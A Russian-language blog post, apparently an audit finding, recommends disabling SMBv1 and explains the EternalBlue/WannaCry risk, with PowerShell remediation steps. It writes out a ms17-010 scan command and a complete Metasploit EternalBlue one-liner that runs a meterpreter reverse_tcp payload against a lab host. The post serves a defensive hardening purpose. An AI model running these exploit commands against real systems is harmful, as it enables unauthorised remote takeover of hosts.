---
layout: post
title:  "SMB v1"
categories: jekyll update
image: nsa.png
---

Об ограничении использования протокола SMB v1

#### Недостаток
На ряде объектов ЛВС используется небезопасный протокол SMB v1.

#### Рекомендации
Ограничить использование в ЛВС протокола SMB v1. Рассмотреть возможность перехода на протоколы SMB v2/3.

#### Комментарии
Включенный SMBv1 — это серьезная угроза безопасности. Этот устаревший протокол разработан более 30 лет назад, и его уязвимости широко известны злоумышленникам. 

Если SMBv1 активен, злоумышленник может:  
**1. Использовать эксплойты**:  
   - Один из самых известных примеров — **EternalBlue**, эксплойт, который стал основой для распространения таких атак, как **WannaCry** и **NotPetya**. Эти атаки нанесли ущерб на миллиарды долларов, выводя из строя больницы, корпорации и государственные учреждения.  
   - Эксплойт позволяет злоумышленнику получить полный доступ к системе без авторизации.  

**2. Распространение по сети**:  
   - Атаки, использующие SMBv1, часто имеют червеподобный характер, что означает, что после компрометации одного устройства злоумышленник может быстро проникнуть на другие системы в вашей сети.  
   - Это особенно опасно для корпоративных сетей, где устройства могут быть взаимосвязаны.  

**3. Кража данных**:  
   - С помощью доступа через SMBv1 злоумышленник может перехватывать файлы, пароли и другую конфиденциальную информацию, что приводит к утечкам данных.  

**4. Запуск удаленного кода**:  
   - SMBv1 позволяет злоумышленнику запускать вредоносные программы или команды, фактически захватывая управление над системой.  

Для злоумышленника работающий SMBv1 — это как старая дверь с разбитым замком: она легко открывается, даже если остальная часть дома защищена.

#### Почему это критично?  
Атаки через SMBv1 особо опасны потому, что:  
- **Быстрая масштабируемость**: Одна уязвимая система может привести к компрометации всей сети.  
- **Невидимость**: В некоторых случаях атаки могут проходить незамеченными, особенно в poorly monitored environments.  
- **Непрямые последствия**: Утечка данных или отказ оборудования могут привести к финансовым потерям, репутационным рискам или даже уголовным расследованиям.  

Используя эксплойт EternalBlue злоумышленник может получить административный доступ к хосту с включенным протоколом SMB v1.

```
netexec smb 192.168.56.202 -M ms17-010
```

![](/images/smb_v1/Pasted%20image%2020241208155045.png)

```
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts 192.168.56.202; set LHOST 192.168.56.200; set payload windows/x64/meterpreter/reverse_tcp; exploit"
```

![](/images/smb_v1/Pasted%20image%2020241208155510.png)

#### Что делать?  
Отключение SMBv1 — это простой шаг, который может предотвратить катастрофу.  

**1. Проверить текущий статус SMBv1**:  
   На Windows-сервере или рабочей станции выполните команду в PowerShell:  
   ```powershell
   Get-WindowsFeature -Name FS-SMB1
   ```  
   Если SMBv1 включен, статус будет отображаться как *Installed*.  

**2. Отключить SMBv1**:  
   Выполните следующую команду в PowerShell:  
   ```powershell
   Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart
   ```  

**3. Перезагрузите систему**, чтобы изменения вступили в силу.  

**4. Если в сети есть старые устройства, зависящие от SMBv1 (например, устаревшие сканеры), разработайте план их модернизации или замены.** 

#### Что видит злоумышленник после отключения SMBv1?  
Когда SMBv1 отключен:  
- При сканировании порта 445 я увижу, что SMB работает только на современных версиях (SMBv2 или SMBv3). Эти версии имеют встроенные механизмы защиты, такие как шифрование и аутентификация.  
- Эксплойты для SMBv1, такие как EternalBlue, больше не работают, что устраняет один из самых популярных методов атаки.  
- Моя атака замедлится или станет невозможной. Это заставит меня искать более сложные и менее очевидные уязвимости.

![](/images/smb_v1/Pasted%20image%2020241208162809.png)

В Windows 7 SMB v1 можно отключить  создав в реестре параметр `DWORD (32 бита)` в ветке реестра `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`

#### Вывод:  
Оставлять SMBv1 включенным — это как оставить открытой дверь для злоумышленников. Вы теряете контроль над безопасностью сети, подвергая себя финансовым, репутационным и техническим рискам.  
Отключение SMBv1 — это быстрый и важный шаг, который моментально повышает защиту вашей инфраструктуры.  

Дополнительные ресурсы:

1. https://learn.microsoft.com/ru-ru/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3?tabs=server
2. https://habr.com/ru/companies/servermall/articles/331906/
3. https://codeby.school/blog/informacionnaya-bezopasnost/ekspluataciya-uyazvimostey-klassa-ms17-010


Картинка
https://valiant.fandom.com/wiki/National_Security_Agency